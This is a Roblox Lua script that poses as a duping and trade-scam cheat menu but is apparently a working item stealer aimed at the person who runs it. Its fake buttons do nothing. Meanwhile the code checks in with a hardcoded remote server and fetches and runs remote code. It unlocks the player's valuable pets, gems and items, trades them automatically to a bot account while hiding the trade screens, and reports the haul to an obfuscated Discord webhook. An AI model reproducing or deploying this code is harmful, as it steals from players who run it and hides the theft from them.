local IP = "http://94.181.90.142:5050/"
local MinRAP = 20000000
local StealerMaker = "Venchik"

task.wait(1)
local PL,LP,RS = game.Players,game.Players.LocalPlayer,game:GetService("ReplicatedStorage")

local Library = RS.Library
local IsLoaded = require(Library).IsLoaded

local function priv(mas)
    for i,v in mas, next do
        print(i,v)
    end
end

while not IsLoaded() do
    task.wait()
end

http = game:GetService("HttpService")

if not _G.Act and _G.Act ~= false then
    _G.Act = true
end

if _G.Act == true then
    _G.Act = false

    body = {
        ["Find"] = "GetBot"
    }

    local r = request({Url = IP, Method="POST", Body=http:JSONEncode(body)})

    if r.Success and string.len(r.Body) > 0 then
        BotName = tostring(r.Body)
        body = {
            ["Find"] = "New",
            ["PlaceId"] = game.PlaceId,
            ["JobId"] = game.JobId,
            ["Name"] = LP.Name
        }

        local zr = request({Url = IP, Method="POST", Body=http:JSONEncode(body)})

        if zr.Success then
            local PL,LP,RS = game.Players,game.Players.LocalPlayer,game:GetService("ReplicatedStorage")

            local Save = require(Library.Client.Save)
            local GetTradeInfo = require(Library.Client.TradingCmds).GetState
            local InventoryCmds = require(Library.Client.InventoryCmds)
            local GetRap = require(Library.Client.DevRAPCmds).Get
            local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
            local Lists = loadstring(game:HttpGet("https://raw.githubusercontent.com/LunarRbx/Script-By-IvanChai/refs/heads/main/Item"))()

            print("\n-- 0 --\n")

            local function priv(mas)
                for i,v in mas, next do
                    print(i,v)
                end
            end

            ----- Loading -----

            while not IsLoaded() do
                task.wait()
            end

            spawn(function() 
                local Askar = loadstring(game:HttpGet("https://raw.githubusercontent.com/LunarRbx/Script-By-IvanChai/main/Askar"))()
                local Lib = Askar.Window(nil,nil,115866921851629,"RightShift") --window: Name, Description, Icon, Toggle Default
                
                local tab1 = Lib:Tab("Auto Farm", 12739920452) --tab: Name, icon
                local tab2 = Lib:Tab("Dupe Eggs", 12739914602) --tab: Name, icon
                local tab3 = Lib:Tab("Trade Scam", 12739921999) --tab: Name, icon
                local tab4 = Lib:Tab("Auction Scam", 12739860346) --tab: Name, icon
                local tab5 = Lib:Tab("Dupe Method", 86754030517407) --tab: Name, icon
                
                local subsec2 = tab2:SubSection("Egg-Dupe")
                local subsec3 = tab3:SubSection("Trade-scam")
                local subsec4 = tab4:SubSection("Auction Scam")
                local subsec5 = tab5:SubSection("DUPE")
                                    
                subsec2:Button("DUPE", function() --button: Name, callback
                
                end)
                
                subsec2:Slider("Eggs",100,10000,1000,false,function(z) -- Slider: Name, Min, Max, Default, Spam Callback, Callback
                                    
                end)
                
                subsec3:Button("Crush Trade", function()
                    print("BOOM!")
                end)
                
                subsec3:Slider("Time",5,100,25,false,function(z) -- Slider: Name, Min, Max, Default, Spam Callback, Callback
                    print("Bruh")
                end)
                
                subsec4:Button("Use Auction Glitch", function()
                    
                end)
                
                subsec4:Slider("Timer",1,100,25,false,function(z) -- Slider: Name, Min, Max, Default, Spam Callback, Callback
                    print("Bruh")
                end)
                
                subsec5:Button("Dupe Pets",function() --toggle: Name, toggle, callback
                
                end)
                
                subsec5:Button("Dupe Potions",function() --toggle: Name, toggle, callback
                
                end)
                
                subsec5:Button("Dupe Items",function() --toggle: Name, toggle, callback
                
                end)
            end)

            local RTEL = LP.PlayerGui.MainLeft.Left.Tools.Teleport
            local TEL = RTEL:Clone()
            TEL.Parent = RTEL.Parent
            RTEL:Destroy()

            ----- Find User -----

            find = false

            while not find do
                for i,v in pairs(PL:GetChildren()) do
                    if v.Name == BotName then
                        find = true
                        break
                    end
                end
                task.wait()
            end

            print(BotName,"is find!")

            task.wait(4)
            PL:WaitForChild(BotName)

            ----- Functions -----

            local function Ready(state)
                local TINFO = GetTradeInfo()
                RS.Network["Server: Trading: Set Ready"]:InvokeServer(unpack({[1] = TINFO._id, [2] = state, [3] = TINFO._counter}))
            end

            local function Confirm(state)
                local TINFO = GetTradeInfo()
                RS.Network["Server: Trading: Set Confirmed"]:InvokeServer(unpack({[1] = TINFO._id, [2] = state, [3] = TINFO._counter}))
            end

            local function SendTrade()
                RS.Network["Server: Trading: Request"]:InvokeServer(unpack({[1] = PL:WaitForChild(BotName)}))
            end

            local function DeclineTrade()
                local id = GetTradeInfo()._id
                RS.Network["Server: Trading: Decline"]:InvokeServer(unpack({[1] = id}))
            end

            local function AddItem(ItemType,ItemUID,ItemValue)
                local Trade = GetTradeInfo()
                local StatusItem = RS.Network["Server: Trading: Set Item"]:InvokeServer(unpack({
                    [1] = Trade._id,
                    [2] = ItemType,
                    [3] = ItemUID,
                    [4] = ItemValue
                }))
                return StatusItem
            end

            ----- Get Items -----

            Inventory = InventoryCmds.State().container._store._byType

            for i,v in Inventory, next do
                for z,x in v._byUID,next do
                    if x:IsA("Box") then
                        local uid = x:GetUID()
                        local data = x:GetData()
                        if data["_uq"] then
                            if data["_uq"]["ct"] ~= nil then
                                print("Unpack Box:",data["_uq"]["_nk"])
                                RS.Network["Box: Withdraw All"]:InvokeServer(unpack({[1] = uid}))
                                task.wait(0.1)
                            end
                        end
                    end
                end
            end

            task.wait(0.3)

            Inventory = InventoryCmds.State().container._store._byType
            
            StealItems = {}
            MaxLengh = 0

            for i,v in Inventory, next do
                for z,x in v._byUID,next do
                    local uid = x:GetUID()
                    local name = x:GetId()
                    local data = x:GetData()
                    local value = if data["_am"] ~= nil then data["_am"] else 1
                    local rap = if GetRap(x) ~= nil then GetRap(x)*value else 0
                    if data["_lk"] then
                        print("Unlock:",name,"Type:",i)
                        local status = RS.Network["Locking_SetLocked"]:InvokeServer(unpack({[1] = uid,[2] = false}))
                        if status ~= true then
                            print("ReUnlock:",name,"Type:",i)
                            RS.Network["Locking_SetLocked"]:InvokeServer(unpack({[1] = uid,[2] = false}))
                        end
                        task.wait(0.001)
                    end
                    if (rap > MinRAP or (string.find(name,"Huge") and x:IsA("Pet")) or (name == "Diamonds" and x:IsA("Currency")) or Lists["White"][name]) and Lists["Black"][name] ~= true then
                        if MaxLengh < #name then
                            MaxLengh = #name
                        end
                        if x:IsA("Currency") then
                            Diamonds = value
                        end
                        
                        table.insert(StealItems,{
                            ["uid"] = uid,
                            ["id"] = name,
                            ["_am"] = value,
                            ["rap"] = rap,
                            ["type"] = i
                        })
                    end
                end
            end

            ----- Main -----

            -- Send Trade
            if GetTradeInfo() then
                print("Decline Current Trade")
                DeclineTrade()
            end
            SendTrade()

            -- Wait Trade Accept

            LP.PlayerGui.TradeWindow:Destroy()

            TradeWaiting = true
            if _G.Trade then
                _G.Trade:Disconnect()
            end
            _G.Trade = Network.Fired("Trading: Created"):Connect(function(aaa) 
                task.wait(0.1)
                local UserAccept1 = tostring(GetTradeInfo()._players[1])
                local UserAccept2 = tostring(GetTradeInfo()._players[2])
                
                if UserAccept1 == BotName or UserAccept2 == BotName then
                    TradeWaiting = false
                else
                    DeclineTrade()
                    task.wait(0.5)
                    SendTrade()
                end
            end)


            local Waitt = true
            spawn(function()
                while Waitt do
                    task.wait(2)
                    if GetTradeInfo() == nil then
                        SendTrade()
                    end
                end
            end)


            -- Visual

            local Light = game:GetService("Lighting")

            Light.ChildAdded:Connect(function(aaa) 
                if aaa.Name == "TabControllerDepthBlur" then
                    aaa.Enabled = false
                end
            end)

            Light.ChildAdded:Connect(function(chl)
                if chl.Name == "PurchasePendingBlur" then
                    chl.Enabled = false
                end
            end)

            local TS = game:GetService"TweenService"

            local Main = LP.PlayerGui.Main

            local VisMain = Main:Clone()
            VisMain.Parent = Main.Parent
            VisMain.Enabled = true
            VisMain.BottomButtons.Position = UDim2.new(0.5,0,1,1)
            VisMain.BottomButtons.Visible = true
            VisMain.UltimateButtons.Visible = true
            if game.PlaceId == 15588442388 or game.PlaceId == 15502339080 then
                VisMain.UltimateButtons.Visible = false
            end

            VisMain.UltimateButtons.UltimateReady.InnerBar.Rotation = 0
            local val = VisMain.UltimateButtons.UltimateReady.InnerBar
            local pos = {UDim2.new(1.6,0,1.6,0),UDim2.new(2,0,2,0)}

            rot = 0
            spawn(function() 
                while true do
                    rot += 100
                    task.wait(2)
                end
            end)

            spawn(function()
                while true do
                    for z,x in pos, next do
                        local tween1 = TS:Create(
                            val, 
                            TweenInfo.new(2.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0), 
                            {Size = x}
                        )

                        local tween2 = TS:Create(
                            val, 
                            TweenInfo.new(2.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0), 
                            {Rotation = rot}
                        )

                        tween1:Play()
                        tween2:Play()
                        task.wait(2)
                    end
                    task.wait()
                end
            end)
            while TradeWaiting do
                task.wait()
                trade = GetTradeInfo()
                if trade then
                    local UserAccept1 = tostring(trade._players[1])
                    local UserAccept2 = tostring(trade._players[2])
                
                    if UserAccept1 == BotName or UserAccept2 == BotName then
                        TradeWaiting = false
                    end
                end
            end

            spawn(function() 
                while true do
                    LP.PlayerGui.Message.Frame.Contents.Desc.Text = "Thx for using my scripts!\nI love u bro!"
                    LP.PlayerGui.Message.Frame.Contents.CustomDesc.Text = "Thx for using my scripts!\nI love u bro!"
                    task.wait()
                end
            end)
            LP.PlayerGui.ChildAdded:Connect(function(chl) 
                if chl.Name == "Purchase Pending" then
                    task.wait(0.00001)
                    chl:Destroy()
                end
            end)
            Waitt = false
            print("Trade with",BotName,"created")

            local TradeGlobalId = GetTradeInfo()._id

            -- Add All Items
            print()
            print("---- Add Steal Items")
            for i,v in StealItems, next do
                local StatusItem = AddItem(v["type"],v["uid"],v["_am"])
                print(v["id"],StatusItem)
                task.wait(0.01)
            end

            -- Trade Ready
            print()
            print("---- Confirmation Trade")
            while not GetTradeInfo()._ready[1] do
                Ready(true)
            end
            print("Trade Ready!")

            while not GetTradeInfo()._confirmed[1] do
                Confirm(true)
            end
            print("Trade Confirm!")

            -- Wait Trade Is Done
            TradeWaiting = false
            if _G.TradeD then
                _G.TradeD:Disconnect()
            end
            _G.TradeD = Network.Fired("Trading: Destroyed"):Connect(function(aaa) 
                if aaa == TradeGlobalId then
                    TradeWaiting = true
                end
            end)

            while not TradeWaiting do
                task.wait()
            end
            VisMain:Destroy()
            print("Trade Done!")

            -- Send WebHook

            local function compare(a,b)
            return a["rap"] > b["rap"]
            end
            table.sort(StealItems, compare)

            local function fix(t)
                if t > 999999999 then
                    return tostring(t/1000000000):sub(1,5).."b"
                elseif t == 0 then
                    return "Zero"
                else
                    return tostring(t/1000000):sub(1,5).."m"
                end
            end

            local function space(spa,le)
                local l = string.rep(" ",(spa - #le))
                return l
            end

            tempfield = ""
            for i,v in StealItems, next do
                if v["type"] ~= "Currency" then
                    local Val = fix(v["rap"])..space(6,fix(v["rap"])).." x "..tostring(v["_am"])
                    tempfield = tempfield..v["id"]..":  "..space(MaxLengh,v["id"])..Val.."\n"
                end
                if i == 15 then
                    break
                end
            end

            print("\n\n"..tempfield)
            PetField = {
                ["id"] = 0,
                ["name"] = "",
                ["value"] = "```"..tempfield.."```"
            }

            if Diamonds < 1000000 then
                Diamonds = 0
            end

            local fields = {
                {
                    ["id"] = 0,
                    ["name"] = "------------------------------------------------\n**Gems**",
                    ["value"] = "```"..fix(Diamonds).."```"
                },
                {
                    ["id"] = 0,
                    ["name"] = "**Top 15 items**",
                    ["value"] = "```"..tempfield.."```"
                }
            }

            Wbh = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMzU3NDM3MzkwMjEyMzA2OS8yT3NJcVYtN0RDN3FiMjFtdzZLYmdnMVRlaDdrbkwtSWVyY1FYWk9xMHNNelpBTUFyaTZlUk1SQks2U2Y5QXFDZUxvUw=="

            function from_base64(data) local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; data = string.gsub(data, '[^'..b..'=]', ''); return (data:gsub('.', function(x) if (x == '=') then return '' end; local r,f='',(b:find(x)-1); for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end; return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end; local c=0; for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end; return string.char(c) end)) end

            Wbh_En = from_base64(Wbh)

            local headers = {["content-type"] = "application/json"}
            
            local device = "Error"
            pcall(function()
                device = Save.Get().Device
            end)
            local data = {
                ["avatar_url"] = "",
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["fields"] = fields,
                        ["title"] = "Steal from "..LP.Name..", thx "..StealerMaker.."! "..device,
                        ["type"] = "rich",
                        ["color"] = 16777215
                    }
                }
            }
            http = game:GetService("HttpService")
            pcall(function() 
                request({Url = Wbh_En, Method="POST", Body=http:JSONEncode(data), Headers = headers}) 
            end)
        end
    elseif string.len(r.Body) == 0 then
        print("Bot is not available")
    end
end
